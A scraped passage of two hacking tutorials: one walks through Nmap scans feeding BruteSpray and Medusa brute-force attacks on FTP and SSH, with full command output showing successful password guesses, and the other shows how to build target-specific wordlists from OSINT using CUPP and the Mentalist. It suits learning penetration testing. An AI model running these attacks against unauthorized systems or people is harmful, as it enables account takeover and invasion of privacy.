        "content": "* WonderHowTo\nUsing Hydra, Ncrack, and other brute-forcing tools to crack passwords for the first time can be frustrating and confusing. To ease into the process, let's discuss automating and optimizing brute-force attacks for potentially vulnerable services such as SMTP, SSH, IMAP, and FTP discovered by Nmap, a popular network scanning utility.\nBruteSpray, developed by Jacob Robles and Shane Young, is a Python script capable of processing an Nmap scan output and automating brute-force attacks against discovered services using Medusa, a popular brute-forcing tool. BruteSpray is the much-needed nexus that unifies Nmap scans and brute-force attacks.\n* Don't Miss: Finding Vulnerabilities in Your Target Using Nmap\nStep 1: Set Up BruteSpray & Medusa\nAn older version of BruteSpray can be found in the Kali repositories. To avoid potential confusion, any version of BruteSpray which may already be installed should be removed using the below apt-get command.\n~$ apt-get autoremove brutespray\nReading package lists... Done\nBuilding dependency tree\nReading state information... Done\nPackage 'brutespray' is not installed, so not removed\nThe following packages will be REMOVED:\n0 upgraded, 0 newly installed, 1 to remove and 1841 not upgraded.\nAfter this operation, 1,073 kB disk space will be freed.\nDo you want to continue? [Y/n] Y\n(Reading database ... 417689 files and directories currently installed.)\nRemoving libgit2-27:amd64 (0.27.7+dfsg.1-0.2+b1) ...\nProcessing triggers for libc-bin (2.29-3) ...\nNext, clone the BruteSpray repository.\n~$ git clone https://github.com/x90skysn3k/brutespray.git\nCloning into 'brutespray'...\nremote: Enumerating objects: 15, done.\nremote: Counting objects: 100% (15/15), done.\nremote: Compressing objects: 100% (15/15), done.\nremote: Total 506 (delta 4), reused 1 (delta 0), pack-reused 491\nReceiving objects: 100% (506/506), 113.29 KiB | 2.31 MiB/s, done.\nResolving deltas: 100% (211/211), done.\nThen, cd into the \"brutespray\" directory and use pip, a tool for installing and managing Python packages, to install the BruteSpray dependencies.\n~$ cd brutespray/\nThe following command is required to run BruteSpray. The -r argument instructs pip to install the dependencies found in the \"requirements.txt\" file.\n~/brutespray$ pip install -r requirements.txt\nCollecting argcomplete==1.10.0\nDownloading https://files.pythonhosted.org/packages/4d/82/f44c9661e479207348a979b1f6f063625d11dc4ca6256af053719bbb0124/argcomplete-1.10.0-py2.py3-none-any.whl\nInstalling collected packages: argcomplete\nSuccessfully installed argcomplete-1.10.0\n* Don't Miss: Python Scripting for the Aspiring Hacker\nLastly, install Medusa. This can be done using the below command.\n~/brutespray$ apt-get install medusa\nReading package lists... Done\nBuilding dependency tree\nReading state information... Done\nThe following packages will be upgraded:\n1 upgraded, 0 newly installed, 0 to remove and 1840 not upgraded.\nNeed to get 0 B/154 kB of archives.\nAfter this operation, 27.6 kB disk space will be freed.\nReading changelogs... Done\n(Reading database ... 417682 files and directories currently installed.)\nPreparing to unpack .../medusa_2.2-6+b1_amd64.deb ...\nUnpacking medusa (2.2-6+b1) over (2.2-6) ...\nSetting up medusa (2.2-6+b1) ...\nProcessing triggers for man-db (2.8.5-2) ...\nThe --help argument can be used to verify BruteSpray is working properly and to view the available options.\n~/brutespray$ ./brutespray.py --help\n#@                           @/\n@@@                               @@@\n%@@@                                   @@@.\n@@@@@                                     @@@@%\n@@@@@                                       @@@@@\n@@@@@@@                  @                  @@@@@@@\n@(@@@@@@@%            @@@@@@@            &@@@@@@@@@\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n@@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@\n@@@( @@@@@#@@@@@@@@@*@@@,@@@@@@@@@@@@@@@  @@@\n@@@@@@ .@@@/@@@@@@@@@@@@@/@@@@ @@@@@@\n@@@   @@@@@@@@@@@   @@@\n@@@@*  ,@@@@@@@@@(  ,@@@@\n@@@@@@@@@@@@@@@@@@@@@@@@@\n@@@.@@@@@@@@@@@@@@@ @@@\n@@@@@@ @@@@@ @@@@@@\n@@@@@@@@@@@@@\n@@   @@@   @@\n@@ @@@@@@@ @@\n██████╗ ██████╗ ██╗   ██╗████████╗███████╗███████╗██████╗ ██████╗  █████╗ ██╗   ██╗\n██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝██╔════╝██╔══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝\n██████╔╝██████╔╝██║   ██║   ██║   █████╗  ███████╗██████╔╝██████╔╝███████║ ╚████╔╝\n██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  ╚════██║██╔═══╝ ██╔══██╗██╔══██║  ╚██╔╝\n██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗███████║██║     ██║  ██║██║  ██║   ██║\n╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝\nbrutespray.py v1.6.6\nCreated by: Shane Young/@x90skysn3k && Jacob Robles/@shellfail\nInspired by: Leon Johnson/@sho-luv\nCredit to Medusa: JoMo-Kun / Foofus Networks <jmk@foofus.net>\nusage: brutespray.py [-h] [-f FILE] [-o OUTPUT] [-s SERVICE] [-t THREADS]\n[-T HOSTS] [-U USERLIST] [-P PASSLIST] [-u USERNAME]\n[-p PASSWORD] [-c] [-i] [-m]\nUsage: python brutespray.py <OPTIONS>\noptional arguments:\n-h, --help            show this help message and exit\nMenu Options:\n-f FILE, --file FILE  GNMAP, JSON or XML file to parse\n-o OUTPUT, --output OUTPUT\nDirectory containing successful attempts\n-s SERVICE, --service SERVICE\nspecify service to attack\n-t THREADS, --threads THREADS\nnumber of medusa threads\n-T HOSTS, --hosts HOSTS\nnumber of hosts to test concurrently\n-U USERLIST, --userlist USERLIST\nreference a custom username file\n-P PASSLIST, --passlist PASSLIST\nreference a custom password file\n-u USERNAME, --username USERNAME\nspecify a single username\n-p PASSWORD, --password PASSWORD\nspecify a single password\n-c, --continuous      keep brute-forcing after success\n-i, --interactive     interactive mode\n-m, --modules         dump a list of available modules to brute\nThat's it for downloading BruteSpray and installing dependencies — there are no modifications or configurations required.\nOther prerequisites which may be useful for following along with this tutorial are Nmap (of course), a general understanding of how Nmap works, and a simple wordlist for password-guessing attacks. Nmap can be installed and downloaded using the below command, if you don't already have it.\n~/brutespray$ apt-get install nmap\nReading package lists... Done\nBuilding dependency tree\nReading state information... Done\nThe following package was automatically installed and is no longer required:\nUse 'apt autoremove' to remove it.\nThe following additional packages will be installed:\nliblinear4 nmap-common\nSuggested packages:\nliblinear-tools liblinear-dev ncat\nThe following NEW packages will be installed:\nThe following packages will be upgraded:\nnmap nmap-common\n2 upgraded, 1 newly installed, 0 to remove and 1838 not upgraded.\nNeed to get 43.6 kB/5,995 kB of archives.\nAfter this operation, 309 kB of additional disk space will be used.\nDo you want to continue? [Y/n] Y\nGet:1 http://archive.linux.duke.edu/kalilinux/kali kali-rolling/main amd64 liblinear4 amd64 2.3.0+dfsg-3 [43.6 kB]\nFetched 43.6 kB in 1s (32.2 kB/s)\nReading changelogs... Done\nSelecting previously unselected package liblinear4:amd64.\n(Reading database ... 417683 files and directories currently installed.)\nPreparing to unpack .../liblinear4_2.3.0+dfsg-3_amd64.deb ...\nUnpacking liblinear4:amd64 (2.3.0+dfsg-3) ...\nPreparing to unpack .../nmap_7.80+dfsg1-2kali1_amd64.deb ...\nUnpacking nmap (7.80+dfsg1-2kali1) over (7.70+dfsg1-6kali1) ...\nPreparing to unpack .../nmap-common_7.80+dfsg1-2kali1_all.deb ...\nUnpacking nmap-common (7.80+dfsg1-2kali1) over (7.70+dfsg1-6kali1) ...\nSetting up liblinear4:amd64 (2.3.0+dfsg-3) ...\nSetting up nmap-common (7.80+dfsg1-2kali1) ...\nSetting up nmap (7.80+dfsg1-2kali1) ...\nProcessing triggers for man-db (2.8.5-2) ...\nProcessing triggers for libc-bin (2.29-3) ...\nThe wordlist I'm using in this guide can be downloaded with the following command. You can, of course, use any wordlist that you want from leaked password databases, other wordlists online, or from custom wordlist-building tools such as Mentalist, CeWL, and Crunch.\n~/brutespray$ wget 'https://raw.githubusercontent.com/tokyoneon/1wordlist/master/1wordlist2rulethem%40ll.txt'\n--2020-01-13 18:59:31--  https://raw.githubusercontent.com/tokyoneon/1wordlist/master/1wordlist2rulethem%40ll.txt\nResolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.0.133, 151.101.64.133, 151.101.128.133, ...\nConnecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.0.133|:443... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 25585 (25K) [text/plain]\nSaving to: ‘1wordlist2rulethem@ll.txt’\n1wordlist2rulethem@ 100%[===================>]  24.99K  --.-KB/s    in 0.04s\n2020-01-13 18:59:31 (645 KB/s) - ‘1wordlist2rulethem@ll.txt’ saved [25585/25585]\nStep 2: Generate Nmap Output Files\nBruteSpray requires an Nmap output file to function. These files can be created using Nmap's -oX or -oG arguments as seen in the below Nmap command. The -sV means it will probe open ports to determine the service and version information.\nUsage of -oG is the most important argument here. It will save the Nmap output to a local file in grepable format. This allows BruteSpray to effectively process the services and ports found on the target server. Similarly, the -oX argument will save the Nmap output to an XML output, which is also supported by BruteSpray but less human-readable.\n~/brutespray$ nmap -sVTU -p ports TargetServer -oG filename.gnmap\nHere's my example of this command and the output:\n~/brutespray$ nmap -sVTU -p21,22,137,161 1X.XXX.XXX.103 -oG tokyoneon.gnmap\nStarting Nmap 7.80 ( https://nmap.org )\nNmap scan report for 1X.XXX.XXX.103\nHost is up (0.00018s latency).\nPORT    STATE         SERVICE    VERSION\n21/tcp  open          ftp        vsftpd 3.0.3\n22/tcp  open          ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)\n137/tcp closed        netbios-ns\n161/tcp closed        snmp\n21/udp  closed        ftp\n22/udp  closed        ssh\n137/udp open          netbios-ns Samba nmbd netbios-ns (workgroup: WORKGROUP)\n161/udp open          snmp       SNMPv1 server; net-snmp SNMPv3 server (public)\nMAC Address: 6C:DB:XX:XX:XX:XX (XXXXX)\nService Info: Host: XXXXX; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 0.60 seconds\nMake sure to replace \"ports\" above with the ports you wan to scan, \"TargetServer\" with the IP address of your target, and \"filename\" with the name you want to give the file. Once done, the newly created .gnmap file can be viewed using the cat command.\n~/brutespray$ cat filename.gnmap\nFor me, after running my example command:\n~/brutespray$ cat tokyoneon.gnmap\n# Nmap 7.80 scan initiated Thu Apr 12 18:34:07 2018 as: nmap -sVTU -p21,22,137,161 -oG tokyoneon.gnmap 1X.XXX.XXX.103\nHost: 1X.XXX.XXX.103 () Status: Up\nHost: 1X.XXX.XXX.103 () Ports: 21/open/tcp//ftp//vsftpd 3.0.3/, 22/open/tcp//ssh//OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)/, 137/closed/tcp//netbios-ns///, 161/closed/tcp//snmp///, 21/closed/udp//ftp///, 22/closed/udp//ssh///, 137/open/udp//netbios-ns//Samba nmbd netbios-ns (workgroup: WORKGROUP)/, 161/open/udp//snmp//SNMPv1 server; net-snmp SNMPv3 server (public WORKGROUP)/\n# Nmap done at Thu Apr 12 18:35:55 2018 -- 1 IP address (1 host up) scanned in 0.60 seconds\nTake note of the \"open\" ports discovered by Nmap as these services are now available for automated brute-force attacks.\nStep 3: Automate Brute-Force Attacks with BruteSpray\nBruteSpray currently supports nearly two dozen services by default. The supported services can be viewed using the --modules argument. They include SSH, FTP, Telnet, VNC, MsSQL, MySQL, PostgreSQL, RSH, IMAP, NNTP, pcAnywhere, POP3, rexec, rlogin, SMBNT, SMTP, SVN, vmauthd, and SNMP.\n~/brutespray$ ./brutespray.py --modules\nCreated by: Shane Young/@x90skysn3k && Jacob Robles/@shellfail\nSupported Services:\n1. Interactive Mode\nThe -i argument can be used to enable an interactive mode, a guided mode designed to maximize the ease of use.\n~/brutespray$ ./brutespray.py --file filename.gnmap -i\n--------------------------------------------\n./brutespray.py --file tokyoneon.gnmap -i\nCreated by: Shane Young/@x90skysn3k && Jacob Robles/@shellfail\nWelcome to interactive mode!\nWARNING: Leaving an option blank will leave it empty and refer to default\nAvailable services to brute-force:\nService: ftp on port 21 with 1 hosts\nService: snmp on port 161 with 1 hosts\nService: ssh on port 22 with 1 hosts\nEnter services you want to brute - default all (ssh,ftp,etc):\nSimply follow the prompts and the brute-force attack will begin.\nEnter services you want to brute - default all (ssh,ftp,etc): ftp\nEnter the number of parallel threads (default is 2): 1\nEnter the number of parallel hosts to scan per service (default is 1): 1\nWould you like to specify a wordlist? (y/n): n\nWould to specify a single username or password (y/n): y\nEnter a username: user\nEnter a password:\nStarting to brute, please make sure to use the right amount of threads(-t) and parallel hosts(-T)...\nOutput will be written to the folder: ./brutespray-output/ \\\nBrute-Forcing...\nMedusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>\nACCOUNT CHECK: [ftp] Host: 1X.XXX.XXX.103 (1 of 1, 0 complete) User: user (1 of 1, 0 complete) Password: 123456 (1 of 9 complete)\nACCOUNT CHECK: [ftp] Host: 1X.XXX.XXX.103 (1 of 1, 0 complete) User: user (1 of 1, 0 complete) Password: 123456789 (2 of 9 complete)\nACCOUNT CHECK: [ftp] Host: 1X.XXX.XXX.103 (1 of 1, 0 complete) User: user (1 of 1, 0 complete) Password: password (3 of 9 complete)\nACCOUNT CHECK: [ftp] Host: 1X.XXX.XXX.103 (1 of 1, 0 complete) User: user (1 of 1, 0 complete) Password: success (4 of 9 complete)\nACCOUNT CHECK: [ftp] Host: 1X.XXX.XXX.103 (1 of 1, 0 complete) User: user (1 of 1, 0 complete) Password: asdfghjkl (5 of 9 complete)\nACCOUNT CHECK: [ftp] Host: 1X.XXX.XXX.103 (1 of 1, 0 complete) User: user (1 of 1, 0 complete) Password: 11111111 (6 of 9 complete)\nACCOUNT CHECK: [ftp] Host: 1X.XXX.XXX.103 (1 of 1, 0 complete) User: user (1 of 1, 0 complete) Password: iloveyou (7 of 9 complete)\nACCOUNT CHECK: [ftp] Host: 1X.XXX.XXX.103 (1 of 1, 0 complete) User: user (1 of 1, 0 complete) Password: letmein (8 of 9 complete)\nACCOUNT CHECK: [ftp] Host: 1X.XXX.XXX.103 (1 of 1, 0 complete) User: user (1 of 1, 0 complete) Password: wonderhow2 (9 of 9 complete)\nACCOUNT CHECK: [ftp] Host: 1X.XXX.XXX.103 User: user Password: wonderhow2 [SUCCESS]\n* Don't Miss: Automate Hacking on the Raspberry Pi with the USB Rubber Ducky\n2. Target Individual Services\nTargeting a single service can be accomplished using the --service argument and specifying the protocol. If the --username argument isn't specified when using --service, BruteSpray will use the default username list found in the wordlist/ssh/user file. This list of usernames can be modified at any time.\n~/brutespray$ ./brutespray.py --file filename.gnmap --service ssh\n--------------------------------------------\n./brutespray.py --file tokyoneon.gnmap --service ssh\nCreated by: Shane Young/@x90skysn3k && Jacob Robles/@shellfail\nStarting to brute, please make sure to use the right amount of threads(-t) and parallel hosts(-T)...\nOutput will be written to the folder: ./brutespray-output/ \\\nBrute-Forcing...\nMedusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>\nACCOUNT CHECK: [ssh] Host: 1X.XXX.XXX.103 (1 of 1, 0 complete) User: root (1 of 3, 0 complete) Password: 123456 (1 of 9 complete)\nACCOUNT CHECK: [ssh] Host: 1X.XXX.XXX.103 (1 of 1, 0 complete) User: root (1 of 3, 0 complete) Password: 123456789 (2 of 9 complete)\nACCOUNT CHECK: [ssh] Host: 1X.XXX.XXX.103 (1 of 1, 0 complete) User: root (1 of 3, 0 complete) Password: password (3 of 9 complete)\nACCOUNT CHECK: [ssh] Host: 1X.XXX.XXX.103 (1 of 1, 0 complete) User: root (1 of 3, 0 complete) Password: success (4 of 9 complete)\nACCOUNT CHECK: [ssh] Host: 1X.XXX.XXX.103 (1 of 1, 0 complete) User: root (1 of 3, 0 complete) Password: asdfghjkl (5 of 9 complete)\nACCOUNT CHECK: [ssh] Host: 1X.XXX.XXX.103 (1 of 1, 0 complete) User: root (1 of 3, 0 complete) Password: 11111111 (6 of 9 complete)\nACCOUNT CHECK: [ssh] Host: 1X.XXX.XXX.103 (1 of 1, 0 complete) User: root (1 of 3, 0 complete) Password: iloveyou (7 of 9 complete)\nACCOUNT CHECK: [ssh] Host: 1X.XXX.XXX.103 (1 of 1, 0 complete) User: root (1 of 3, 0 complete) Password: letmein (8 of 9 complete)\nACCOUNT CHECK: [ssh] Host: 1X.XXX.XXX.103 (1 of 1, 0 complete) User: root (1 of 3, 1 complete) Password: wonderhow2 (9 of 9 complete)\nACCOUNT CHECK: [ssh] Host: 1X.XXX.XXX.103 (1 of 1, 0 complete) User: admin (2 of 3, 1 complete) Password: 123456 (1 of 9 complete)\nACCOUNT CHECK: [ssh] Host: 1X.XXX.XXX.103 (1 of 1, 0 complete) User: admin (2 of 3, 1 complete) Password: 123456789 (2 of 9 complete)\nACCOUNT CHECK: [ssh] Host: 1X.XXX.XXX.103 (1 of 1, 0 complete) User: user (2 of 3, 1 complete) Password: 123456 (1 of 9 complete)\nACCOUNT CHECK: [ssh] Host: 1X.XXX.XXX.103 (1 of 1, 0 complete) User: admin (2 of 3, 1 complete) Password: password (3 of 9 complete)\nACCOUNT CHECK: [ssh] Host: 1X.XXX.XXX.103 (1 of 1, 0 complete) User: user (2 of 3, 1 complete) Password: 123456789 (2 of 9 complete)\nACCOUNT CHECK: [ssh] Host: 1X.XXX.XXX.103 (1 of 1, 0 complete) User: user (2 of 3, 1 complete) Password: password (3 of 9 complete)\nACCOUNT CHECK: [ssh] Host: 1X.XXX.XXX.103 (1 of 1, 0 complete) User: admin (2 of 3, 1 complete) Password: success (4 of 9 complete)\nACCOUNT CHECK: [ssh] Host: 1X.XXX.XXX.103 (1 of 1, 0 complete) User: admin (2 of 3, 1 complete) Password: asdfghjkl (5 of 9 complete)\nACCOUNT CHECK: [ssh] Host: 1X.XXX.XXX.103 (1 of 1, 0 complete) User: user (2 of 3, 1 complete) Password: success (4 of 9 complete)\nACCOUNT CHECK: [ssh] Host: 1X.XXX.XXX.103 (1 of 1, 0 complete) User: admin (3 of 3, 1 complete) Password: 11111111 (6 of 9 complete)\nACCOUNT CHECK: [ssh] Host: 1X.XXX.XXX.103 (1 of 1, 0 complete) User: user (3 of 3, 1 complete) Password: asdfghjkl (5 of 9 complete)\nACCOUNT CHECK: [ssh] Host: 1X.XXX.XXX.103 (1 of 1, 0 complete) User: user (3 of 3, 1 complete) Password: 11111111 (6 of 9 complete)\nACCOUNT CHECK: [ssh] Host: 1X.XXX.XXX.103 (1 of 1, 0 complete) User: admin (3 of 3, 1 complete) Password: iloveyou (7 of 9 complete)\nACCOUNT CHECK: [ssh] Host: 1X.XXX.XXX.103 (1 of 1, 0 complete) User: admin (3 of 3, 1 complete) Password: letmein (8 of 9 complete)\nACCOUNT CHECK: [ssh] Host: 1X.XXX.XXX.103 (1 of 1, 0 complete) User: user (3 of 3, 1 complete) Password: iloveyou (7 of 9 complete)\nACCOUNT CHECK: [ssh] Host: 1X.XXX.XXX.103 (1 of 1, 0 complete) User: admin (3 of 3, 1 complete) Password: wonderhow2 (9 of 9 complete)\nACCOUNT CHECK: [ssh] Host: 1X.XXX.XXX.103 (1 of 1, 0 complete) User: user (3 of 3, 2 complete) Password: letmein (8 of 9 complete)\nACCOUNT CHECK: [ssh] Host: 1X.XXX.XXX.103 (1 of 1, 0 complete) User: user (3 of 3, 2 complete) Password: wonderhow2 (9 of 9 complete)\nCCOUNT CHECK: [ssh] Host: 1X.XXX.XXX.103 User: user Password: wonderhow2 [SUCCESS]\n3. Configure Custom Wordlists & Usernames (Optional)\nThere are small built-in wordlists and username lists that are automatically used when a particular service is brute-forced. For example, the \"password\" file, located in the wordlist/ssh/ directory, contains passwords used when brute-forcing SSH services. Each supported service has its own dedicated directory in the wordlist/ directory.\n~/brutespray$ ls -F wordlist/\nftp/   mssql/  nntp/        postgres/  rlogin/  smbnt/  ssh/  telnet/   vnc/\nimap/  mysql/  pcanywhere/  rexec/     rsh/     smtp/   svn/  vmauthd/\nIt would be possible to manually change the built-it wordlists using the below cp command to copy over a custom wordlist.\n~/brutespray$ cp /path/to/customPasswords.list wordlist/ssh/password\nBuilt-in username lists can also be changed using the below command.\n~/brutespray$ cp /path/to/customUser.list wordlist/vnc/user\nAlternatively, custom password and usernames lists can be used from command line with the --passlist and --username arguments.\n~/brutespray$ ./brutespray.py --file filename.gnmap --username UsernameHere --passlist /path/to/desired/passwords.list --service ftp\n-----------------------------------------------------------------------------------------------------------------------\n./brutespray.py --file tokyoneon.gnmap --passlist /root/to/Desktop/passwords.list --service ftp\nCreated by: Shane Young/@x90skysn3k && Jacob Robles/@shellfail\nStarting to brute, please make sure to use the right amount of threads(-t) and parallel hosts(-T)...\nOutput will be written to the folder: ./brutespray-output/ \\\nBrute-Forcing...\nMedusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>\nACCOUNT CHECK: [ftp] Host: 1X.XXX.XXX.103 (1 of 1, 0 complete) User: user (1 of 1, 0 complete) Password: 123456 (1 of 9 complete)\nACCOUNT CHECK: [ftp] Host: 1X.XXX.XXX.103 (1 of 1, 0 complete) User: user (1 of 1, 0 complete) Password: 123456789 (2 of 9 complete)\nACCOUNT CHECK: [ftp] Host: 1X.XXX.XXX.103 (1 of 1, 0 complete) User: user (1 of 1, 0 complete) Password: password (3 of 9 complete)\nACCOUNT CHECK: [ftp] Host: 1X.XXX.XXX.103 (1 of 1, 0 complete) User: user (1 of 1, 0 complete) Password: success (4 of 9 complete)\nACCOUNT CHECK: [ftp] Host: 1X.XXX.XXX.103 (1 of 1, 0 complete) User: user (1 of 1, 0 complete) Password: asdfghjkl (5 of 9 complete)\nACCOUNT CHECK: [ftp] Host: 1X.XXX.XXX.103 (1 of 1, 0 complete) User: user (1 of 1, 0 complete) Password: 11111111 (6 of 9 complete)\nACCOUNT CHECK: [ftp] Host: 1X.XXX.XXX.103 (1 of 1, 0 complete) User: user (1 of 1, 0 complete) Password: iloveyou (7 of 9 complete)\nACCOUNT CHECK: [ftp] Host: 1X.XXX.XXX.103 (1 of 1, 0 complete) User: user (1 of 1, 0 complete) Password: letmein (8 of 9 complete)\nACCOUNT CHECK: [ftp] Host: 1X.XXX.XXX.103 (1 of 1, 0 complete) User: user (1 of 1, 0 complete) Password: wonderhow2 (9 of 9 complete)\nACCOUNT CHECK: [ftp] Host: 1X.XXX.XXX.103 User: user Password: wonderhow2 [SUCCESS]\nThose are just a few examples. If you need any more help on this, hit me up in the comments below or over on Twitter @tokyoneon_.\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.\nCover photo by Jefferson Santos/PEXELS and Screenshots by tokyoneon/Null Byte",
        "category": "Password Cracking"
    },
    {
        "title": "Create Custom Wordlists for Password Cracking Using the Mentalist",
        "link": "https://null-byte.wonderhowto.com/how-to/create-custom-wordlists-for-password-cracking-using-mentalist-0183992/",
        "content": "* WonderHowTo\nBeginners learning brute-forcing attacks against WPA handshakes are often let down by the limitations of default wordlists like RockYou based on stolen passwords. The science of brute-forcing goes beyond using these default lists, allowing us to be more efficient by making customized wordlists. Using the Mentalist, we can generate millions of likely passwords based on details about the target.\nPassword cracking is a long-established art, relying on a combination of brute-force processing power and the ability to refine your list down to likely options based on what you know about a target. Many security protocols are vulnerable to brute-forcing attacks, which at its core relies on a few key principals.\nFirst, you must be allowed to try different passwords many times very quickly. Second, you need to be able to determine the difference between a password success and failure. Third, you need a list of passwords to automatically try very quickly. And finally, the password must be present in the list in order for the attack to succeed. As password lists get bigger, CPU and GPU performance becomes more important as the rate at which passwords can be attempted is sped up.\nBrute-Forcing WPA, SSH, FTP & Other Passwords\nMost wireless networks are secured by WPA or WPA2 encryption, which is able to be cracked by capturing a network handshake and using your computer's CPU to brute-force the password. Beside WPA, protocols like SSH and FTP are also vulnerable to brute-forcing, although the methods of brute-forcing can be differentiated between online and offline type attacks.\nIn an online attack, we connect directly to a service and send password attempts in a way that can be logged. An example of this would be Reaver or SSHtrix, which need to be connected to the network the host is on in order to send password guesses. In these attacks, the limiting factor is often how many incoming connections the FTP or SSH server can accept and the amount of time you must spend connected to the host while cracking.\nIn an offline attack, the major limiting factor is your CPU or GPU's ability to try different passwords quickly. Examples of this can be brute-forcing a WPA handshake, a WPS-Pixie dust attack after collecting the necessary information, or cracking password hashes from a stolen database. In general, this is the only time you need to be worried about your GPU or CPU performance while brute-forcing.\nOptions to Start With — Default Lists\nRather than simply start with a dictionary-style attack, a smart attacker will often first look for lists that contain real passwords. These lists are generally regarded as the starting point for these sorts of techniques, as they will work against anyone with a truly awful or common password. In the wild, you can expect success rates of around 15% for these sorts of password audits. Obviously, if you are targeting a specific account or network, this is a pretty small chance of success.\nDon't Miss: How to Use Leaked Password Databases to Create Brute-Force Wordlists\nThat being said, you can still use these lists as a seed for a more refined attack based on information you know about the target. The reason these lists are effective is that you can think of them as a statistical survey of the most common passwords people use in the wild. Since the average user will reuse these passwords in multiple accounts, we can use the most common passwords as a seed to change small things, like adding or removing numbers, in a program called a word mangler.\nDetails Approach — OSINT Research\nFortunately for hackers, a wealth of information exists online when trying to crack a specific target. A brute-force attack by the average script-kiddie may not be a substantial threat to an organization that enforces using strong passwords. A well-researched brute-force attack, however, can cut down the number of guesses and present only relatively strong guesses based on available information about the target and any password requirements. This can make a brute-force attack effective against selected, well-researched parts of a target's infrastructure.\nWith some research, we can supply the data for wordlist creator programs which takes information learned about a target and generates a custom wordlist based on details it's likely the user may have created their password from.\nCustom Wordlist Generators\nThere are a number of options for creating wordlists besides a simple dictionary, and the one we'll explore today is Common User Passwords Profiler (or CUPP). A lightweight, simple Python program, CUPP is capable of generating an impressive seed of personalized password guesses. Other tools, like CeWL, allow for target websites to be scraped for unique words in order to use words that are common across the organization.\nDon't Miss: How to Crack Passwords with a CeWL-Based Custom Wordlist\nWith a little bit of knowledge gleaned from social media and other public documents, running CUPP in the user interactive mode allows an interview-style approach to creating a custom password list.\nThe example above produced 14,301 words in our test file, which is a great start, but nowhere near enough to wage an effective brute-force attack. However, we can use this output to use a more sophisticated wordlist creator called a word mangler to apply certain rules to these initial seeds to make a much larger password list to pull from.\nWord Manglers & Generating Chains\nA word mangler creates new password guesses from a list of \"seed\" passwords, according to preset rules. This can be a very simple change, like applying a single change to the end of each seed password, or a more complex one, like adding every number from 0-9 to the end of each seed password. The latter would yield 10 new passwords guesses for every one password that goes into the program, so these lists can get large very quickly.\nTo manage these rules easily, we'll be using a graphical program called the Mentalist that will allow us to create a \"chain\" of these rules to apply to our seed password list. We can also throw in other seeds besides our password list, like the words in the English dictionary. In general, the major \"nodes\" that can be applied to the base word list will append, prepend, change the case, or substitute letters from the words passed through them.\nDon't Miss: Principles & Technologies You Need to Know Before Cracking Passwords\nAs you can see in the example below, applying only a few rules to the chain can lead to a huge increase in the size of your password list. This isn't necessarily good, as we'll need to to have a processor capable of actually chewing threw these password guesses. This password list of over a billion guesses is probably overkill. The size of the list depends on the number and type of nodes you apply, but we'll go through each of them.\nStep 1: Download the Software\nThe Mentalist is easy to run even for absolute beginners, so we can download it for Windows, macOS, or Linux. To do so, you can head to the download link on GitHub and select the version that matches your operating system. After downloading it, install the application following the on-screen prompts, then open the Mentalist.\nTo create our seed list, we'll use CUPP. Aside from making sure you have Python installed and updated on your computer, it shouldn't require additional dependencies to run. You can download CUPP by running the following in a terminal window.\ngit clone github.com/Mebus/cupp.git\nStep 2: Create the Seed List\nOnce you've downloaded CUPP, you'll be ready to use the data you've gathered on a target to generate a custom list. Navigate to the directory CUPP was cloned into by typing cd CUPP into your terminal window. Next, type python ./cupp.py -i to run CUPP in the interactive-user mode.\nYou'll see a series of prompts asking for information about the target. If you don't know, you can skip the particular question, but it's best to answer as many questions as you can find the information for.\nOnce you enter the information you know, you'll be given the opportunity to add additional keywords you know about the target that can be thrown into the mix. At this point, you can also select the option to add special characters at the end of a password guess or add random numbers at the end. Finally, if your target thinks using leetspeak is clever, you can select a substitution rule that will convert password guesses to 1337 formatting.\nOnce this is complete, the output should be a text file with thousands of password guesses. While this is a great start, it's time to expand our guesses with the Mentalist.\nStep 3: Create a Chain with the Mentalist\nTo get started, open the Mentalist application you downloaded and installed previously. Once you see the GUI window, click on the plus in the \"Base Words\" node, and you'll see the option to add a custom file. Select \"Custom File,\" and then open the TXT file we created with CUPP. We can also delete the English dictionary default node by clicking the minus button to the right of it.\nOnce we have the base words added from CUPP, we can start adding our word mangling nodes. To create a chain, we will need to apply all of the rules we'd like to apply to our password guesses in sequence. We can explore the four main types of nodes we can add by clicking on the plus button in the top-right corner. This will give us a list of case modification, substitution, prepend, or append.\nFor our first node, we can apply a \"Case\" node to modify the case of our generated password guesses. Once we select the node, we can click the plus button next to the node we created to see a list of options. We have the ability to modify uppercase or lowercase in different ways. Here, we'll set the first letter to uppercase, and all following letters to lowercase. Since this operation only creates one output per word from our base list, you won't see the size of the wordlist file change yet.\nNext, we can add a \"Substitution\" node by clicking the plus icon in the top-right corner again. This will give us the option to substitute letters, and in this case, we'll choose to substitute the letters \"i\" and \"a\" for their leetspeak counterpart.\nNext, we can add a \"Prepend\" node, which will add something to the beginning of each password guess. By clicking the plus icon next to the node we created, we can do things like incorporate zip codes by city or state. This will increase the size of our file by creating many outputs for each base word that goes into the node.\nFinally, we can add an \"Append\" node, which will put something at the end of our word guesses. By again clicking on the plus icon next to the node we created, we can see there are many options preinstalled for what we can add to our chain. In this case, I chose to add telephone area codes from the city of Los Angeles. This will increase our output even more, as for each guess passing into this node, there will be many 